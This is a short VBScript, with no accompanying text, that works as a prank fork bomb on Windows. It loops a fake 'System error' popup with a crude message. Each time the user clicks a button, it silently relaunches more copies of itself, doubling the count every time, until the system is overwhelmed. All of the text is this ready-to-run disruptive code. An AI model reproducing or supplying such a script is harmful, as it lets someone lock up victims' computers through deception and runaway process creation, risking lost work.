On Error Resume Next

Dim wsh, count, i, result
Set wsh = CreateObject("WScript.Shell")
count = 1

Do
    result = wsh.Popup("Your computer is fucked!", 0, "System error", 17)
    If result = 1 Or result = 2 Then
        For i = 1 To count
            wsh.Run "wscript.exe " & Chr(34) & WScript.ScriptFullName & Chr(34), 0, False
        Next
        count = count * 2
    End If
Loop